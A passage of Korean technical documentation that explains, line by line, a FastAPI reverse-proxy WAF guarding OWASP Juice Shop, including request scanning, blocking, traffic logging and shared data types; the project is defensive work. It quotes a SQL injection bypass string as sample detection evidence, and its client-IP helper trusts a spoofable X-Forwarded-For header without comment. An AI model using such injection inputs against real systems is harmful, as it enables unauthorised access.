→ `httpx`: 업스트림 서버로 HTTP 요청을 비동기로 포워딩할 때 사용하는 클라이언트.  
→ `jinja2`: 대시보드 HTML 렌더링용 템플릿 엔진.  
→ `FastAPI, Request, Response`: 핵심 프레임워크 클래스.  
→ `MutableHeaders`: httpx 응답의 헤더를 가변 딕셔너리로 변환할 때 필요 (Starlette의 Response는 list 형태 헤더를 그대로 넣으면 AttributeError 발생).  
→ `HTMLResponse`: HTML 문자열을 HTTP 응답으로 반환할 때.  
→ `JSONResponse`: JSON 딕셔너리를 HTTP 응답으로 반환할 때.  
→ `RedirectResponse`: 307 리다이렉트 응답.  
→ `StaticFiles`: CSS/JS 같은 정적 파일을 특정 URL 경로에서 서빙할 때.  
→ `BaseModel`: Pydantic 모델 — 요청 바디를 자동으로 파싱·검증할 때 사용 (A05 테스트 API에서 사용).

```python
from detector import (
    all_findings,
    findings_at_or_above_severity,
    parse_severity,
    scan_request,
)
from owasp.types import Severity
from request_snapshot import DEFAULT_BODY_PREVIEW_MAX, request_to_context
import traffic_log
```
→ 프로젝트 내부 모듈들을 임포트.  
→ `scan_request`: 10개 OWASP 모듈에 요청을 넘겨 스캔 결과를 받아옴.  
→ `all_findings`: 여러 모듈 결과에서 Finding 목록을 하나로 합침.  
→ `findings_at_or_above_severity`: 특정 심각도 이상의 Finding만 필터링.  
→ `parse_severity`: 문자열(`"high"`)을 `Severity` enum으로 변환.  
→ `request_to_context`: Starlette `Request` 객체를 `RequestContext`로 변환.  
→ `traffic_log`: 요청 이벤트를 메모리 버퍼에 기록.

---

#### 설정 상수 (29~86줄)

```python
UPSTREAM_RAW = os.environ.get("UPSTREAM_URL", "http://127.0.0.1:3001").rstrip("/")
_parsed = urlparse(UPSTREAM_RAW)
if not _parsed.scheme or not _parsed.netloc:
    raise SystemExit("UPSTREAM_URL must be a full URL, e.g. http://127.0.0.1:3001")
```
→ 환경 변수에서 업스트림 URL을 가져옴. 없으면 `http://127.0.0.1:3001` 기본값.  
→ `.rstrip("/")`: URL 끝의 슬래시를 제거해 이중 슬래시(`//`) 방지.  
→ `urlparse`로 scheme(http)과 netloc(127.0.0.1:3001)을 검증. 잘못된 URL이면 앱 시작 자체를 막음.  
→ `raise SystemExit`: 일반 예외와 달리 프로세스를 즉시 종료. 오류 메시지를 stderr에 출력.

```python
UPSTREAM_BASE = UPSTREAM_RAW
UPSTREAM_HOST_HEADER = _parsed.netloc
UPSTREAM_ORIGIN = f"{_parsed.scheme}://{_parsed.netloc}".rstrip("/")
```
→ `UPSTREAM_BASE`: 업스트림으로 요청 포워딩 시 기본 URL.  
→ `UPSTREAM_HOST_HEADER`: 업스트림으로 요청할 때 `Host` 헤더에 넣을 값. SPA(Single Page App)나 가상 호스팅 환경에서 올바른 Host 전달이 필요.  
→ `UPSTREAM_ORIGIN`: scheme + host만으로 구성된 origin (HTML 내 절대 URL 치환 시 사용).

```python
PROXY_REWRITE_MAX_BYTES = int(os.environ.get("PROXY_REWRITE_MAX_BYTES", str(6 * 1024 * 1024)))
```
→ 응답 바디 URL 치환 최대 크기: 기본 6MiB. 대용량 바이너리(이미지 등)는 치환 건너뜀.

---

#### 헬퍼 함수들 (43~93줄)

```python
def _waf_enabled() -> bool:
    v = os.environ.get("WAF_ENABLED", "true").strip().lower()
    return v not in ("0", "false", "no", "off")
```
→ `WAF_ENABLED` 환경 변수를 읽어 WAF 활성화 여부를 반환.  
→ "0", "false", "no", "off" 중 하나면 False, 그 외 모든 값은 True.  
→ 함수로 감싼 이유: 런타임에 환경 변수가 바뀔 수 있기 때문에 매번 새로 읽음(핫 리로드 지원).

```python
def _waf_block_min_severity() -> Severity:
    return parse_severity(os.environ.get("WAF_BLOCK_MIN_SEVERITY", "high"), Severity.HIGH)
```
→ 차단 임계 심각도를 환경 변수에서 읽어 `Severity` enum으로 반환.  
→ 잘못된 값이 들어오면 `parse_severity`가 `Severity.HIGH`로 폴백.

```python
def _body_preview_max() -> int:
    raw = os.environ.get("WAF_BODY_PREVIEW_MAX", "").strip()
    if not raw:
        return DEFAULT_BODY_PREVIEW_MAX
    try:
        return max(256, min(int(raw), 1024 * 1024))
    except ValueError:
        return DEFAULT_BODY_PREVIEW_MAX
```
→ 바디 미리보기 최대 크기를 읽음.  
→ `max(256, min(int(raw), 1024 * 1024))`: 최소 256바이트 ~ 최대 1MiB로 클램핑. 너무 작거나 큰 값 방지.

```python
HOP_BY_HOP = frozenset({
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade", "host",
})
```
→ HTTP/1.1 스펙의 hop-by-hop 헤더 목록. 리버스 프록시는 이 헤더들을 업스트림으로 그대로 전달하면 안 됨.  
→ 예를 들어 `Transfer-Encoding: chunked`를 그대로 보내면 업스트림이 혼란을 겪을 수 있음.  
→ `frozenset`: 불변 집합. `in` 연산이 O(1)로 매우 빠름.

---

#### FastAPI 앱 초기화 (76~88줄)

```python
app = FastAPI(title="AI Security System", description="Reverse proxy to upstream web app")
```
→ FastAPI 앱 인스턴스 생성. `title`과 `description`은 자동 생성되는 `/docs` Swagger UI에 표시됨.

```python
_BASE = Path(__file__).resolve().parent
```
→ `main.py`가 위치한 디렉토리의 절대 경로. 템플릿·정적 파일 경로를 상대 경로 없이 안전하게 참조.

```python
_jinja_env = jinja2.Environment(
    loader=jinja2.FileSystemLoader(str(_BASE / "templates")),
    autoescape=jinja2.select_autoescape(["html", "xml"]),
)
```
→ Jinja2 환경 객체 생성.  
→ `FileSystemLoader`: `templates/` 디렉토리에서 템플릿 파일을 로드.  
→ `autoescape=select_autoescape(["html", "xml"])`: HTML/XML 템플릿에서 `<`, `>`, `&` 등을 자동 이스케이프 → XSS 방지.

```python
WAF_UI_PREFIX = "/__waf"
```
→ WAF 전용 UI 경로 접두사. Juice Shop도 `/dashboard`, `/api/` 경로를 사용하므로 충돌 방지를 위해 `/__waf/` 아래에 배치.

---

#### URL/경로 정규화 헬퍼 (90~103줄)

```python
def _normalize_proxy_path_segment(full_path: str) -> str:
    return (full_path or "").strip().rstrip("/")
```
→ catch-all 라우트에서 받은 경로를 끝 슬래시 제거 후 반환. 대소문자 비교 전 정규화.

```python
def _is_waf_dashboard_path(norm: str) -> bool:
    n = norm.casefold()
    return n == "dashboard" or n == "__waf/dashboard"
```
→ 경로가 대시보드인지 대소문자 구분 없이 확인.  
→ `.casefold()`: `lower()`보다 더 공격적인 소문자 변환 (독일어 ß → ss 등 유니코드 처리).

---

#### 업스트림 연결 확인 (105~118줄)

```python
async def _probe_upstream() -> tuple[bool, str]:
    timeout = httpx.Timeout(3.0)
    try:
        async with httpx.AsyncClient(follow_redirects=True) as client:
            r = await client.head(UPSTREAM_BASE, timeout=timeout)
            if r.status_code == 405:
                r = await client.get(UPSTREAM_BASE, timeout=timeout)
            ok = r.status_code < 500
            return (ok, "" if ok else f"HTTP {r.status_code}")
    except httpx.HTTPError as exc:
        return (False, str(exc)[:200])
    except OSError as exc:
        return (False, str(exc)[:200])
```
→ 대시보드 요약 API에서 업스트림 상태를 확인할 때 호출.  
→ 먼저 `HEAD` 요청으로 가볍게 확인 → 405(Method Not Allowed)면 `GET`으로 재시도.  
→ `status_code < 500`: 404, 302 등은 서버가 살아 있다고 판단. 5xx만 "장애"로 처리.  
→ `httpx.Timeout(3.0)`: 3초 안에 응답이 없으면 실패 처리. 대시보드 로딩 지연 방지.  
→ `str(exc)[:200]`: 예외 메시지가 너무 길면 200자로 자름.

---

#### 대시보드 요약 데이터 생성 (120~130줄)

```python
def _dashboard_summary_dict(*, upstream_ok: bool, upstream_error: str) -> dict[str, Any]:
    return {
        "status": "ok",
        "upstream": UPSTREAM_BASE,
        "upstream_ok": upstream_ok,
        "upstream_error": upstream_error,
        "waf_enabled": _waf_enabled(),
        "waf_block_min_severity": _waf_block_min_severity().value,
        "body_preview_max": _body_preview_max(),
    }
```
→ 대시보드 JavaScript가 소비하는 JSON 데이터 구조를 생성.  
→ `*` 표시: 키워드 전용 인자. 호출 시 반드시 `upstream_ok=True` 형태로 명시해야 함 → 인자 순서 오류 방지.

---

#### 클라이언트 IP 추출 (133~142줄)

```python
def _client_ip(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    rip = request.headers.get("x-real-ip")
    if rip:
        return rip.strip()
    if request.client:
        return request.client.host or "—"
    return "—"
```
→ 클라이언트 실제 IP를 추출하는 함수. 프록시 체인을 고려함.  
→ `X-Forwarded-For`: Nginx, AWS ELB 등이 추가하는 헤더. 여러 IP가 콤마로 연결되므로 첫 번째가 원본 IP.  
→ `X-Real-IP`: 단순 프록시가 사용하는 헤더.  
→ `request.client.host`: 직접 연결 시 TCP 소켓의 원격 IP.  
→ `"—"`: 모든 방법으로도 IP를 알 수 없을 때 폴백 문자.

---

#### 업스트림 헤더 필터링 (161~168줄)

```python
def _upstream_headers(request: Request) -> dict[str, str]:
    out: dict[str, str] = {}
    for key, value in request.headers.items():
        if key.lower() in HOP_BY_HOP:
            continue
        out[key] = value
    out["host"] = UPSTREAM_HOST_HEADER
    return out
```
→ 클라이언트 요청 헤더에서 hop-by-hop 헤더를 제거하고 업스트림으로 전달할 헤더만 반환.  
→ `out["host"] = UPSTREAM_HOST_HEADER`: `Host` 헤더를 업스트림 주소로 덮어씀.  
→ 예: 클라이언트가 `Host: 192.168.1.5:8080`으로 보내도 업스트림엔 `Host: 127.0.0.1:3001`이 전달됨.

---

#### 업스트림 Origin 변형 목록 (176~193줄)

```python
def _upstream_origin_variants() -> list[str]:
    variants = [UPSTREAM_ORIGIN]
    host = (_parsed.hostname or "").lower()
    scheme = (_parsed.scheme or "http").lower()
    port = _parsed.port
    if port is None:
        port = 443 if scheme == "https" else 80
    if host in ("127.0.0.1", "localhost"):
        alt = "localhost" if host == "127.0.0.1" else "127.0.0.1"
        variants.append(f"{scheme}://{alt}:{port}")
    ...
    return out
```
→ Juice Shop HTML/JS 안에 박힌 `http://127.0.0.1:3001` 형태의 절대 URL을 교체할 때, 127.0.0.1과 localhost를 동일 서버로 인식하여 둘 다 교체한다.  
→ 예: `http://127.0.0.1:3001/api/products` → `http://192.168.0.5:8080/api/products`

---

#### 응답 바디 URL 치환 (205~233줄)

```python
def _media_type_should_rewrite_body(ct_header: str) -> bool:
    main = (ct_header or "").split(";")[0].strip().lower()
    if main in ("text/html", "application/json", "text/css"):
        return True
    if "javascript" in main or "ecmascript" in main:
        return True
    return False
```
→ Content-Type이 텍스트 기반(HTML, JSON, CSS, JS)일 때만 URL 치환 시도.  
→ JPEG, PNG, PDF 같은 바이너리는 건너뜀 → 속도 최적화 + 바이너리 손상 방지.

```python
def _rewrite_response_body_for_public_origin(
    content: bytes, content_type: str, request: Request
) -> bytes:
    if len(content) > PROXY_REWRITE_MAX_BYTES:
        return content
    if not _media_type_should_rewrite_body(content_type):
        return content
    try:
        text = content.decode("utf-8")
    except UnicodeDecodeError:
        return content
    pub = _request_public_origin(request)
    changed = False
    for orig in sorted(_upstream_origin_variants(), key=len, reverse=True):
        if orig in text:
            text = text.replace(orig, pub)
            changed = True
    if not changed:
        return content
    return text.encode("utf-8")
```
→ 업스트림 응답 바디에서 `http://127.0.0.1:3001` 같은 내부 URL을 클라이언트가 접속한 실제 주소로 교체.  
→ `sorted(..., key=len, reverse=True)`: 긴 URL부터 교체. 짧은 걸 먼저 교체하면 중복 치환 오류 발생 가능.  
→ `changed = False` 최적화: 치환이 일어나지 않으면 새 bytes 생성 없이 원본 반환.

---

#### 프록시 응답 빌더 (236~254줄)

```python
def _build_proxied_upstream_response(request: Request, upstream: httpx.Response) -> Response:
    ct = upstream.headers.get("content-type", "")
    content = _rewrite_response_body_for_public_origin(upstream.content, ct, request)
    out = MutableHeaders()
    for key, value in upstream.headers.multi_items():
        lk = key.lower()
        if lk in HOP_BY_HOP:
            continue
        if lk in ("content-length", "content-encoding", "transfer-encoding"):
            continue
        if lk == "location":
            value = _rewrite_location_header(value, request)
        out.append(key, value)
    return Response(
        content=content,
        status_code=upstream.status_code,
        headers=out,
    )
```
→ httpx의 업스트림 응답을 Starlette `Response`로 변환하는 함수.  
→ `MutableHeaders()`: Starlette Response는 dict 형태 헤더만 수용. httpx는 리스트 형태로 헤더를 반환하므로 변환 필요.  
→ `content-length` 제거: 바디 URL 치환으로 크기가 변할 수 있어, 브라우저가 잘못된 크기를 읽지 않도록 제거.  
→ `content-encoding` 제거: httpx가 이미 gzip 해제를 해주므로 중복 처리 방지.  
→ `location` 헤더: 리다이렉트 URL도 내부 주소이면 교체.

---

#### 업스트림 포워딩 (`_forward`) (257~282줄)

```python
async def _forward(request: Request, full_path: str) -> Response:
    path = full_path.lstrip("/")
    url = f"{UPSTREAM_BASE}/{path}" if path else UPSTREAM_BASE
    if request.url.query:
        url = f"{url}?{request.url.query}"

    body = await request.body()
    headers = _upstream_headers(request)

    async with httpx.AsyncClient(follow_redirects=False) as client:
        try:
            upstream = await client.request(
                request.method,
                url,
                headers=headers,
                content=body if body else None,
                timeout=httpx.Timeout(60.0),
            )
        except httpx.RequestError as exc:
            return Response(
                content=f"Upstream unreachable: {exc}".encode(),
                status_code=502,
                media_type="text/plain; charset=utf-8",
            )

    return _build_proxied_upstream_response(request, upstream)
```
→ 실제 업스트림 서버로 요청을 전달하는 핵심 함수.  
→ `follow_redirects=False`: 업스트림의 302 같은 리다이렉트를 그대로 클라이언트에 전달 (프록시가 자동으로 따라가면 안 됨).  
→ `body if body else None`: 빈 바디(GET 요청 등)는 None으로 전달해 불필요한 Content-Length: 0 방지.  
→ `timeout=httpx.Timeout(60.0)`: 업스트림이 느린 경우 최대 60초 대기.  
→ `httpx.RequestError`: 연결 거부, DNS 실패 등 네트워크 레벨 오류. 이 경우 502 Bad Gateway 반환.

---

#### WAF 차단 판단 함수 (`_waf_response_or_none`) (292~311줄)

```python
async def _waf_response_or_none(request: Request) -> Response | None:
    """Run OWASP modules; return 403 HTML block page if policy says block, else None (allow)."""
    if not _waf_enabled():
        return None
    ctx = await request_to_context(request, body_preview_max=_body_preview_max())
    results = await scan_request(ctx)
    findings = all_findings(results)
    min_sev = _waf_block_min_severity()
    blocking = findings_at_or_above_severity(findings, min_sev)
    if not blocking:
        return None
    from owasp.a05 import make_block_html
    return HTMLResponse(
        content=make_block_html(tuple(blocking)),
        status_code=403,
    )
```
→ WAF의 핵심 판단 함수. 모든 OWASP 모듈을 실행하고 차단 여부를 결정.

**단계별 처리:**
1. `_waf_enabled()` → WAF가 꺼져 있으면 즉시 None 반환 (스캔 건너뜀).
2. `request_to_context()` → HTTP 요청을 OWASP 모듈이 처리 가능한 `RequestContext`로 변환.
3. `scan_request(ctx)` → 10개 OWASP 모듈을 순서대로 실행하여 각각의 `ModuleScanResult` 수집.
4. `all_findings(results)` → 10개 결과에서 모든 Finding을 하나의 리스트로 합침.
5. `findings_at_or_above_severity()` → 차단 임계 심각도 이상의 Finding만 추출.
6. 없으면 `None` 반환 → 업스트림으로 통과.
7. 있으면 `a05.make_block_html()`로 HTML 차단 페이지를 생성하여 403으로 반환.

---

#### 라우트 정의

**헬스 체크 (313~321줄)**
```python
@app.get("/__proxy/health")
async def proxy_health() -> dict[str, Any]:
    return {
        "status": "ok",
        "upstream": UPSTREAM_BASE,
        "waf_enabled": _waf_enabled(),
        "waf_block_min_severity": _waf_block_min_severity().value,
        "dashboard_path": f"{WAF_UI_PREFIX}/dashboard",
    }
```
→ WAF 프록시 자체의 상태를 확인하는 엔드포인트. Kubernetes liveness probe 등에서 활용.  
→ 업스트림 연결을 실제로 확인하지 않음 (프록시 프로세스 자체의 상태만).

**대시보드 (332~346줄)**
```python
async def dashboard_page(request: Request) -> HTMLResponse:
    initial = await api_dashboard_summary(request)
    tpl = _jinja_env.get_template("dashboard.html")
    html = tpl.render(
        upstream=UPSTREAM_BASE,
        boot=initial,
    )
    return HTMLResponse(html, headers={"Cache-Control": "no-store, no-cache, must-revalidate", ...})
```
→ Jinja2로 `dashboard.html`을 렌더링하여 반환.  
→ `boot=initial`: 페이지 로드 시 초기 데이터를 HTML에 직접 심어줌 → JavaScript가 API를 다시 호출하기 전에 화면을 즉시 채움 (첫 렌더링 지연 방지).  
→ `Cache-Control: no-store`: 대시보드는 항상 최신 상태여야 하므로 캐시 완전 비활성화.

**정적 파일 마운트 (371~376줄)**
```python
_WAF_STATIC_DIR = _BASE / "static" / "waf"
app.mount(
    "/__waf/static",
    StaticFiles(directory=str(_WAF_STATIC_DIR)),
    name="waf_static",
)
```
→ `static/waf/` 디렉토리를 `/__waf/static/` URL로 서빙.  
→ CSS: `/__waf/static/css/dashboard.css`, JS: `/__waf/static/js/dashboard.js` 경로.  
→ `app.mount()` 주의: `@app.api_route("/__waf/{waf_tail:path}")` 보다 **먼저** 등록해야 정적 파일이 catch-all에 먹히지 않음.

**A05 Injection 테스트 API (415~453줄)**
```python
class _A05ScanRequest(BaseModel):
    method: str = "GET"
    path: str = "/"
    query: str = ""
    body: str = ""
    headers: dict[str, str] = {}


@app.post("/__waf/api/scan/a05")
async def waf_scan_a05(req: _A05ScanRequest) -> dict:
    from owasp import a05 as _a05
    from owasp.types import RequestContext

    ctx = RequestContext(
        method=req.method.upper(),
        path=req.path,
        query_string=req.query,
        headers=req.headers,
        body_preview=req.body,
    )
    result = await _a05.scan(ctx)
    findings = [
        {"rule_id": f.rule_id, "severity": f.severity.value, "evidence": f.evidence}
        for f in result.findings
    ]
    return {
        "owasp_id": result.owasp_id,
        "total": len(findings),
        "blocked": any(f["severity"] in ("critical", "high") for f in findings),
        "findings": findings,
    }
```
→ 대시보드 테스트 패널에서 호출하는 API.  
→ `_A05ScanRequest` Pydantic 모델: 요청 바디의 JSON을 자동으로 파싱·검증. 타입이 맞지 않으면 422 자동 반환.  
→ `method.upper()`: "get" → "GET" 정규화.  
→ `any(... "critical" or "high")`: Finding 중 하나라도 HIGH 이상이면 `blocked: true` 표시.

**프록시 캐치-올 라우트 (456~487줄)**
```python
@app.api_route("/", methods=METHODS)
async def proxy_root(request: Request) -> Response:
    blocked = await _waf_response_or_none(request)
    if blocked is not None:
        await traffic_log.record(request, status_code=403, blocked=True)
        return blocked
    resp = await _forward(request, "")
    await traffic_log.record(request, status_code=resp.status_code, blocked=False)
    return resp


@app.api_route("/{full_path:path}", methods=METHODS)
async def proxy_path(full_path: str, request: Request) -> Response:
    ...
    blocked = await _waf_response_or_none(request)
    if blocked is not None:
        await traffic_log.record(request, status_code=403, blocked=True)
        return blocked
    resp = await _forward(request, full_path)
    await traffic_log.record(request, status_code=resp.status_code, blocked=False)
    return resp
```
→ Juice Shop으로 오는 모든 일반 요청을 처리하는 최종 라우트.  
→ `methods=METHODS`: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD 모두 처리.  
→ 처리 흐름: WAF 스캔 → 차단되면 403 반환 + 로그 기록 → 통과되면 업스트림 포워딩 + 로그 기록.  
→ `/{full_path:path}` 패턴: 모든 경로 (`/`, `/login`, `/api/products?q=apple` 등)를 캐치.

---

### 3.2 `detector.py`

> **역할:** 10개 OWASP 모듈을 순서대로 실행하고, Finding 집계·정책 판단 유틸리티를 제공한다.

```python
"""Run all OWASP Top 10:2025 modules against a request snapshot."""

from __future__ import annotations
from owasp import MODULES
from owasp.types import Finding, ModuleScanResult, RequestContext, Severity
```
→ `MODULES`는 `owasp/__init__.py`에서 정의한 10개 모듈의 튜플.

```python
_SEVERITY_RANK: dict[Severity, int] = {
    Severity.NONE: 0,
    Severity.LOW: 1,
    Severity.MEDIUM: 2,
    Severity.HIGH: 3,
    Severity.CRITICAL: 4,
}
```
→ `Severity` enum을 숫자로 변환하는 매핑. "HIGH 이상" 같은 임계값 비교에 사용.  
→ 직접 enum을 비교하지 않고 이 딕셔너리를 쓰는 이유: enum은 순서 비교(`>=`)가 기본 지원되지 않음.

```python
async def scan_request(ctx: RequestContext) -> list[ModuleScanResult]:
    return [await mod.scan(ctx) for mod in MODULES]
```
→ 10개 모듈 각각의 `scan(ctx)` 함수를 순서대로 `await` 호출.  
→ 리스트 컴프리헨션으로 결과를 `list[ModuleScanResult]`로 수집.  
→ **주의:** 현재는 순차 실행. 향후 `asyncio.gather(*[mod.scan(ctx) for mod in MODULES])`로 병렬화 가능.

```python
def all_findings(results: list[ModuleScanResult]) -> list[Finding]:
    out: list[Finding] = []
    for r in results:
        out.extend(r.findings)
    return out
```
→ 10개 모듈 결과를 하나의 Finding 리스트로 합침.  
→ `r.findings`는 `tuple[Finding, ...]` 타입이므로 `extend()`로 리스트에 펼침.

```python
def findings_at_or_above_severity(
    findings: list[Finding],
    min_severity: Severity,
) -> list[Finding]:
    threshold = _SEVERITY_RANK[min_severity]
    return [f for f in findings if _SEVERITY_RANK[f.severity] >= threshold]
```
→ `min_severity` 이상의 Finding만 필터링.  
→ 예: `min_severity=Severity.HIGH`이면 `_SEVERITY_RANK[HIGH]=3` → 3 이상인 HIGH(3), CRITICAL(4)만 반환.

```python
def parse_severity(name: str, default: Severity = Severity.HIGH) -> Severity:
    key = (name or "").strip().lower()
    if not key:
        return default
    try:
        return Severity(key)
    except ValueError:
        return default
```
→ 문자열 → Severity enum 변환.  
→ `Severity("high")` → `Severity.HIGH` (Severity는 `str, Enum`을 상속하므로 값으로 직접 생성 가능).  
→ 잘못된 값(`"super-critical"`)이 들어오면 `ValueError`를 잡아 `default`로 폴백.

---

### 3.3 `request_snapshot.py`

> **역할:** Starlette `Request` 객체를 OWASP 모듈이 사용하는 `RequestContext` 데이터클래스로 변환한다.

```python
"""Map any incoming HTTP request to OWASP RequestContext (upstream-agnostic)."""

from __future__ import annotations
from starlette.requests import Request
from owasp.types import RequestContext

DEFAULT_BODY_PREVIEW_MAX = 8192
```
→ 기본 바디 미리보기: 8192바이트 (8KiB). 대부분의 form 데이터, JSON API 요청은 이 크기 안에 들어옴.

```python
async def request_to_context(
    request: Request,
    *,
    body_preview_max: int = DEFAULT_BODY_PREVIEW_MAX,
) -> RequestContext:
    """Read body once (Starlette caches it for later handlers)."""
    body = await request.body()
    preview = body[:body_preview_max].decode("utf-8", errors="replace")
    headers = {k: v for k, v in request.headers.items()}
    path = request.url.path or "/"
    query = request.url.query or ""
    return RequestContext(
        method=request.method.upper(),
        path=path,
        query_string=query,
        headers=headers,
        body_preview=preview,
    )
```
→ **`await request.body()`:** Starlette는 바디를 내부적으로 캐시하므로 여러 번 읽어도 안전.  
→ **`body[:body_preview_max]`:** 큰 파일 업로드 시 전체를 메모리에 올리지 않고 앞부분만 검사.  
→ **`.decode("utf-8", errors="replace")`:** 바이너리 데이터가 포함된 경우 `UnicodeDecodeError` 대신 `?` 문자로 대체하여 안전하게 처리.  
→ **`{k: v for k, v in request.headers.items()}`:** 헤더를 일반 딕셔너리로 변환. Starlette 헤더는 특수 Mapping 객체이므로 OWASP 모듈에서 다루기 쉽게 변환.  
→ **`path or "/"`:** 경로가 비어 있으면 루트 `/`로 처리.

---

### 3.4 `traffic_log.py`

> **역할:** 프록시를 통과한 요청 이벤트를 메모리의 링 버퍼(ring buffer)에 기록하고, 대시보드 API에 스냅샷을 제공한다.

```python
"""In-memory ring buffer of recent proxy requests (for dashboard live feed)."""

from __future__ import annotations
import asyncio
from collections import deque
from dataclasses import asdict, dataclass
from datetime import datetime
from typing import Any
from zoneinfo import ZoneInfo
```
→ `deque`: 양쪽 끝에서 삽입·삭제가 O(1)인 자료구조. `maxlen` 설정 시 꽉 차면 자동으로 오래된 항목 제거 → 링 버퍼 구현.  
→ `asdict`: dataclass 인스턴스를 딕셔너리로 변환 (JSON 직렬화용).  
→ `ZoneInfo`: Python 3.9+의 표준 시간대 라이브러리.

```python
TZ_SEOUL = ZoneInfo("Asia/Seoul")
MAX_EVENTS = 200
_LOCK = asyncio.Lock()
```
→ `TZ_SEOUL`: 대시보드 시각을 KST(한국 표준시, UTC+9)로 표시하기 위해 사용.  
→ `MAX_EVENTS = 200`: 최대 200개 이벤트만 메모리에 유지. 오래된 것은 자동 삭제.  
→ `_LOCK = asyncio.Lock()`: 비동기 락. 여러 코루틴이 동시에 `_EVENTS`를 수정할 때 데이터 경합(race condition) 방지.

```python
@dataclass(frozen=True, slots=True)
class TrafficEvent:
    time_iso: str
    client_ip: str
    method: str
    path: str
    user_agent: str
    status_code: int
    blocked: bool
```
→ 개별 요청 이벤트를 나타내는 불변(frozen) 데이터클래스.  
→ `frozen=True`: 생성 후 필드 수정 불가 → 데이터 일관성 보장.  
→ `slots=True`: `__slots__` 자동 생성 → 메모리 효율성 향상 (200개 × 7 필드).

```python
_EVENTS: deque[TrafficEvent] = deque(maxlen=MAX_EVENTS)
_CLIENT_AGG: dict[str, dict[str, str | int]] = {}
```
→ `_EVENTS`: 최근 200개 요청 이벤트의 링 버퍼.  
→ `_CLIENT_AGG`: IP별 접속 집계 딕셔너리. `{"IP주소": {"first_seen": "...", "last_seen": "...", "requests": 5, "user_agent": "..."}}`.

```python
def should_log_path(path: str) -> bool:
    p = path or "/"
    return not (p == "/__proxy" or p.startswith("/__proxy/") or
                p == "/__waf" or p.startswith("/__waf/"))
```
→ `/__proxy/` 및 `/__waf/` 경로는 WAF 내부 요청이므로 로그에서 제외.  
→ 대시보드가 자기 자신의 API를 폴링하는 것이 로그에 쌓이면 노이즈가 됨.

```python
async def record(request: Request, *, status_code: int, blocked: bool) -> None:
    if not should_log_path(request.url.path):
        return
    ua = request.headers.get("user-agent") or "—"
    if len(ua) > 220:
        ua = ua[:217] + "…"
    time_iso = datetime.now(TZ_SEOUL).strftime("%Y-%m-%d %H:%M:%S")
    cip = _client_ip(request)
    ev = TrafficEvent(...)
    async with _LOCK:
        _EVENTS.append(ev)
        row = _CLIENT_AGG.get(cip)
        if row is None:
            _CLIENT_AGG[cip] = {"first_seen": time_iso, "last_seen": time_iso,
                                 "requests": 1, "user_agent": ua}
        else:
            row["last_seen"] = time_iso
            row["requests"] = int(row["requests"]) + 1
            row["user_agent"] = ua
```
→ `async with _LOCK:`: 비동기 컨텍스트 관리자. Lock을 획득한 코루틴만 내부 코드를 실행.  
→ UA 220자 제한: 공격자가 매우 긴 UA를 보내도 메모리 폭발 방지.  
→ `_CLIENT_AGG` 업데이트: 같은 IP에서 온 요청은 카운터만 증가, 처음 온 IP는 새 항목 추가.

```python
async def snapshot_dicts() -> list[dict[str, str | int | bool]]:
    async with _LOCK:
        return [asdict(e) for e in reversed(_EVENTS)]
```
→ 최신 이벤트부터 반환 (`reversed()`). 대시보드 테이블 최상단에 최신 요청이 표시됨.  
→ `async with _LOCK`: 읽기도 락을 사용하여 읽는 도중 수정 방지.

```python
async def clients_snapshot() -> dict[str, Any]:
    async with _LOCK:
        items = []
        for ip, row in _CLIENT_AGG.items():
            items.append({"client_ip": ip, **dict(row)})
        items.sort(key=lambda x: str(x.get("last_seen", "")), reverse=True)
        return {"status": "ok", "unique_clients": len(items), "clients": items}
```
→ 고유 IP별 접속 현황을 `last_seen` 기준 내림차순으로 정렬하여 반환.

---

## 4. `owasp/` 패키지

---

### 4.1 `owasp/types.py`

> **역할:** 프로젝트 전체에서 공유하는 핵심 데이터 타입을 정의한다. 모든 OWASP 모듈의 공통 인터페이스.

```python
from __future__ import annotations
from dataclasses import dataclass
from enum import Enum
```

```python
class Severity(str, Enum):
    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"
```
→ `str, Enum` 동시 상속: enum이면서 문자열처럼 동작.  
→ `f.severity.value` → `"high"` (JSON 직렬화 시 그대로 문자열 사용 가능).  
→ `Severity("high")` → `Severity.HIGH` (역직렬화도 지원).  
→ 5단계 심각도: NONE(탐지 없음) < LOW < MEDIUM < HIGH < CRITICAL.

```python
@dataclass(frozen=True, slots=True)
class RequestContext:
    method: str       # "GET", "POST" 등
    path: str         # "/search", "/api/users/1" 등
    query_string: str # "q=apple&sort=price" (? 이후 부분)
    headers: dict[str, str]  # 헤더 딕셔너리
    body_preview: str # 요청 바디의 처음 N바이트 (UTF-8 문자열)
```
→ OWASP 모듈들이 입력으로 받는 요청 스냅샷.  
→ `frozen=True`: 모듈이 실수로 RequestContext를 수정하지 못하도록 보호.  
→ `slots=True`: 메모리 효율화.  
→ `body_preview`: 전체 바디가 아닌 미리보기만 저장하여 메모리 절약.

```python
@dataclass(frozen=True, slots=True)
class Finding:
    rule_id: str    # "A05-SQL-001" 형태
    evidence: str   # 탐지 근거 설명 + 실제 탐지된 값
    severity: Severity  # 이 Finding의 심각도
```
→ 하나의 보안 취약점 탐지 결과를 나타냄.  
→ `rule_id`: 어떤 규칙에 걸렸는지 (추적성·필터링에 사용).  
→ `evidence`: "SQL 인증 우회 (OR/AND 조건) | 탐지값: `' OR '1'='1`" 같은 형태.

```python
@dataclass(frozen=True, slots=True)
class ModuleScanResult:
    module_id: str          # "a05"
    owasp_id: str           # "A05:2025"
    findings: tuple[Finding, ...]  # 0개 이상의 Finding
```
→ 하나의 OWASP 모듈이 스캔을 마친 후 반환하는 결과.  
→ `tuple[Finding, ...]`: 불변 컨테이너 사용 → 탐지 결과가 실수로 수정되지 않도록 보호.

```python
def clean_result(*, module_id: str, owasp_id: str) -> ModuleScanResult:
    return ModuleScanResult(module_id=module_id, owasp_id=owasp_id, findings=())
```
→ Finding이 없는 클린 결과를 생성하는 편의 함수.  
→ 스켈레톤 모듈들이 `return clean_result(...)` 한 줄로 깔끔하게 사용.

---

### 4.2 `owasp/__init__.py`

> **역할:** 10개 OWASP 모듈을 등록하고 `MODULES` 튜플을 제공하는 패키지 레지스트리.

```python
from __future__ import annotations
from collections.abc import Awaitable, Callable
from dataclasses import dataclass
from owasp import a01, a02, a03, a04, a05, a06, a07, a08, a09, a10
